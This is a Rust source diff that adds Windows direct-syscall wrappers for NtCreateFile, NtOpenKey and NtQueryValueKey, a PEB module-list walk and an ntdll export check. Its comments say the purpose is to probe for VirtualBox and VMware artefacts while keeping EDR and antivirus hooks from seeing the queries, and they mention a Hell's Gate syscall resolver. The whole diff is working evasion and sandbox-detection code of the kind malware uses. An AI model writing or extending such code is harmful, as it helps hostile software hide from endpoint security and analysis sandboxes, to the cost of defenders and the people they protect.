@@ -335,6 +335,58 @@ pub unsafe fn syscall1(nr: u16, a0: usize) -> i32 {
     syscall4(nr, a0, 0, 0, 0)
 }
 
+/// Direct syscall with 6 arguments (4 in registers + 2 on the stack).
+#[inline]
+pub unsafe fn syscall6(
+    nr: u16,
+    a0: usize, a1: usize, a2: usize, a3: usize,
+    a4: usize, a5: usize,
+) -> i32 {
+    // Delegate to syscall7 with a7=0; the extra zero on the stack is harmless.
+    syscall7(nr, a0, a1, a2, a3, a4, a5, 0)
+}
+
+/// Direct syscall with 11 arguments (4 in registers + 7 on the stack).
+///
+/// Used for `NtCreateFile` which takes 11 parameters.
+#[inline]
+pub unsafe fn syscall11(
+    nr: u16,
+    a0: usize, a1: usize, a2: usize, a3: usize,
+    a4: usize, a5: usize, a6: usize, a7: usize,
+    a8: usize, a9: usize, a10: usize,
+) -> i32 {
+    let mut rax: u64 = nr as u64;
+    // 0x60 = 32 (shadow) + 7×8 (stack args) rounded up to 16-byte boundary.
+    core::arch::asm!(
+        "sub rsp, 0x60",
+        "mov qword ptr [rsp+0x20], {a4}",
+        "mov qword ptr [rsp+0x28], {a5}",
+        "mov qword ptr [rsp+0x30], {a6}",
+        "mov qword ptr [rsp+0x38], {a7}",
+        "mov qword ptr [rsp+0x40], {a8}",
+        "mov qword ptr [rsp+0x48], {a9}",
+        "mov qword ptr [rsp+0x50], {a10}",
+        "syscall",
+        "add rsp, 0x60",
+        inlateout("rax") rax,
+        in("r10") a0,
+        in("rdx") a1,
+        in("r8")  a2,
+        in("r9")  a3,
+        a4  = in(reg) a4,
+        a5  = in(reg) a5,
+        a6  = in(reg) a6,
+        a7  = in(reg) a7,
+        a8  = in(reg) a8,
+        a9  = in(reg) a9,
+        a10 = in(reg) a10,
+        lateout("rcx") _,
+        lateout("r11") _,
+    );
+    rax as i32
+}
+
 /// Direct syscall with 7 arguments (4 in registers + 3 on the stack).
 ///
 /// Stack layout before `syscall`:
@@ -513,4 +565,168 @@ pub unsafe fn nt_close(handle: usize) -> i32 {
         None => return 0xC000_0001_u32 as i32,
     };
     syscall1(nr, handle)
+}
+
+// ── NtCreateFile ──────────────────────────────────────────────────────────────
+
+/// `NtCreateFile` via direct syscall — replaces `CreateFileA`.
+///
+/// Use for existence-probing VM device paths.
+/// `object_attrs` must contain a `UNICODE_STRING` in NT namespace form
+/// (e.g. `\??\VBoxGuest`).
+///
+/// On success the returned handle must be closed with `nt_close`.
+pub unsafe fn nt_create_file(
+    handle_out:         *mut usize,
+    desired_access:     u32,
+    object_attrs:       *mut ObjectAttributes,
+    io_status:          *mut u64,     // *mut IO_STATUS_BLOCK (16 bytes)
+    share_access:       u32,
+    create_disposition: u32,
+    create_options:     u32,
+) -> i32 {
+    let nr = match resolve("NtCreateFile") {
+        Some(n) => n,
+        None => return 0xC000_0001_u32 as i32,
+    };
+    syscall11(
+        nr,
+        handle_out as usize,            // FileHandle (out)
+        desired_access as usize,        // DesiredAccess
+        object_attrs as usize,          // ObjectAttributes
+        io_status as usize,             // IoStatusBlock
+        0,                              // AllocationSize (NULL)
+        0,                              // FileAttributes
+        share_access as usize,          // ShareAccess
+        create_disposition as usize,    // CreateDisposition
+        create_options as usize,        // CreateOptions
+        0,                              // EaBuffer (NULL)
+        0,                              // EaLength
+    )
+}
+
+// ── NtOpenKey / NtQueryValueKey ───────────────────────────────────────────────
+
+/// `NtOpenKey` via direct syscall — replaces `RegOpenKeyExW`.
+///
+/// `object_attrs` must contain a UNICODE_STRING with the full NT registry path
+/// (e.g. `\Registry\Machine\SOFTWARE\VMware, Inc.\VMware Tools\0`).
+pub unsafe fn nt_open_key(
+    key_handle:   *mut usize,
+    desired_access: u32,
+    object_attrs: *mut ObjectAttributes,
+) -> i32 {
+    let nr = match resolve("NtOpenKey") {
+        Some(n) => n,
+        None => return 0xC000_0001_u32 as i32,
+    };
+    syscall3(nr, key_handle as usize, desired_access as usize, object_attrs as usize)
+}
+
+/// `NtQueryValueKey` via direct syscall — replaces `RegQueryValueExW`.
+///
+/// Use `info_class = 1` (KeyValuePartialInformation) for value reads.
+/// Output buffer layout: `[u32 TitleIndex][u32 Type][u32 DataLength][u8 Data…]`
+pub unsafe fn nt_query_value_key(
+    key_handle:  usize,
+    value_name:  *mut UnicodeString,
+    info_class:  u32,
+    buf:         *mut u8,
+    buf_len:     u32,
+    result_len:  *mut u32,
+) -> i32 {
+    let nr = match resolve("NtQueryValueKey") {
+        Some(n) => n,
+        None => return 0xC000_0001_u32 as i32,
+    };
+    syscall6(
+        nr,
+        key_handle,
+        value_name as usize,
+        info_class as usize,
+        buf as usize,
+        buf_len as usize,
+        result_len as usize,
+    )
+}
+
+// ── Stealthy module enumeration ───────────────────────────────────────────────
+
+/// Walk the PEB `InLoadOrderModuleList` to check whether a DLL is currently
+/// loaded into the process.
+///
+/// Functionally identical to `GetModuleHandleA` but never calls it, so EDR/AV
+/// hooks on `kernel32!GetModuleHandleA` cannot observe the query.
+///
+/// `dll_name` is the base filename including extension (e.g. `"vmGuestLib.dll"`).
+/// Comparison is case-insensitive ASCII.
+///
+/// # Safety
+/// Must be called only on Windows x86-64 with a valid TEB/PEB.
+pub unsafe fn peb_module_loaded(dll_name: &str) -> bool {
+    let peb: *const u8;
+    core::arch::asm!(
+        "mov {}, qword ptr gs:[0x60]",
+        out(reg) peb,
+        options(nostack, preserves_flags),
+    );
+    if peb.is_null() {
+        return false;
+    }
+
+    // PEB+0x18 = Ldr (PPEB_LDR_DATA)
+    let ldr: *const u8 = *(peb.add(0x18) as *const *const u8);
+    if ldr.is_null() {
+        return false;
+    }
+
+    // PEB_LDR_DATA+0x10 = InLoadOrderModuleList.Flink
+    let list_head = ldr.add(0x10);
+    let mut flink: *const u8 = *(list_head as *const *const u8);
+
+    let target = dll_name.as_bytes();
+
+    loop {
+        if flink == list_head || flink.is_null() {
+            break;
+        }
+
+        // LDR_DATA_TABLE_ENTRY offsets (x64):
+        //   +0x058  BaseDllName.Length (u16, byte count, no null terminator)
+        //   +0x060  BaseDllName.Buffer (*u16)
+        let name_byte_len = *(flink.add(0x58) as *const u16) as usize;
+        let name_buf: *const u16 = *(flink.add(0x60) as *const *const u16);
+
+        if name_byte_len > 0 && !name_buf.is_null() {
+            let wchars = name_byte_len / 2;
+            if wchars == target.len() {
+                let matches = (0..wchars).all(|i| {
+                    (*name_buf.add(i) as u8).to_ascii_lowercase()
+                        == target[i].to_ascii_lowercase()
+                });
+                if matches {
+                    return true;
+                }
+            }
+        }
+
+        flink = *(flink as *const *const u8);
+    }
+    false
+}
+
+/// Return `true` if ntdll.dll exports `fn_name`, without calling
+/// `GetProcAddress`.
+///
+/// Uses `ntdll_base()` (PEB walk) and the in-memory PE export scanner already
+/// used by the Hell's Gate resolver, so `kernel32!GetProcAddress` is never
+/// touched.
+pub fn ntdll_export_exists(fn_name: &str) -> bool {
+    unsafe {
+        let base = match ntdll_base() {
+            Some(b) => b,
+            None => return false,
+        };
+        find_export(base, fn_name).is_some()
+    }
 }
